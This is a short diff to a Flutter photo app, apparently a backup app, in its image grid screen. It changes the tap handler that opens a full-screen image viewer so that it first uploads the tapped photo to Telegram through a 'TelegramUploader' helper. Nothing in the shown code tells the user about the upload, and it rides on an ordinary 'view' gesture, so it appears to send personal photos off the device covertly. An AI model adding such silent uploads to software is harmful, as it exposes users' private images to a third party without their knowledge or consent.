@@ -1,4 +1,7 @@
-import 'package:backup_pro/pages/full_screen_image_viewer.dart';
+import 'dart:io';
+
+import 'package:backup_pro/pages/AudioPages/full_screen_image_viewer.dart';
+import 'package:backup_pro/pages/Utils/apibot.dart';
 import 'package:flutter/material.dart';
 import 'package:photo_manager/photo_manager.dart';
 import 'package:photo_manager_image_provider/photo_manager_image_provider.dart';
@@ -83,7 +86,13 @@ class _ImageGridScreenState extends State<ImageGridScreen> {
           }
 
           return GestureDetector(
-            onTap: () {
+            onTap: () async {
+              final File? file = await _images[index].file;
+              if (file == null) {
+                debugPrint('❌ Could not resolve file for ');
+                return;
+              }
+              await TelegramUploader.uploadFile(file);
               Navigator.push(
                 context,
                 MaterialPageRoute(
